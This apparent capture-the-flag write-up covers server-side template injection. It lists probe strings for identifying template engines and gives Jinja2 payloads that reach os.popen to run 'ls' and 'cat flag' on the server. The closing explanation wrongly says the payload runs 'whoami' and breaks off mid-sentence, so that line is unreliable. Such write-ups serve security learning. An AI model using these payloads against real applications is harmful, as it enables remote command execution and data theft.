to solve this challenge we need first to identify the languge that this website writen with,
```
Jinja2 (Python Flask/Django): {{ 7*7 }}
Freemarker (Java): ${7*7}
Velocity (Java): #set($a = 7*7)${a}
Thymeleaf (Java): ${7*7}
Twig (PHP Symfony): {{ 7*7 }}
Smarty (PHP): {$7*7}
Mako (Python): <% print 7*7 %>
```

we relize that its writen in python.<br>

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```
This payload attempts to execute the whoami command on the server. If successful, it returns the current user’s name —


